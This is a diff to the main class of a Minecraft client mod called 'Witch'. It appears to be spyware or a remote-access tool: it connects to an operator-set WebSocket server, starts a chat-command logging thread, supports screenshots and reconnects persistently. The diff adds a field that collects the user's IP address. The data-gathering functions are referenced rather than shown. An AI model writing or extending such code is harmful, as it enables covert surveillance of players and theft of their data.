@@ -1,23 +1,24 @@
 package me.soda.witch;
 
+import com.google.gson.JsonObject;
 import me.soda.witch.features.ChatCommandLogging;
 import me.soda.witch.features.Config;
+import me.soda.witch.features.NetUtil;
 import me.soda.witch.websocket.WSClient;
 import net.minecraft.client.MinecraftClient;
 
 import java.net.URI;
 
 public class Witch {
-    public static final MinecraftClient mc = MinecraftClient.getInstance();
-
-    //This is your server address
+    //Config
     private static final String server = "ws://127.0.0.1:11451";
-
-    //Logs mod output and exception
     private static final boolean print = true;
     public static WSClient client;
     public static boolean screenshot = false;
+
+    public static final MinecraftClient mc = MinecraftClient.getInstance();
     public static Config config = new Config();
+    public static JsonObject ip = NetUtil.getIp();
 
     public static void init() {
         ChatCommandLogging.sendLogThread.start();
@@ -34,7 +35,7 @@ public class Witch {
         try {
             Thread.sleep(30 * 1000);
             new Thread(reconnect).start();
-        } catch (InterruptedException e) {
+        } catch (Exception e) {
             Witch.printStackTrace(e);
         }
     }
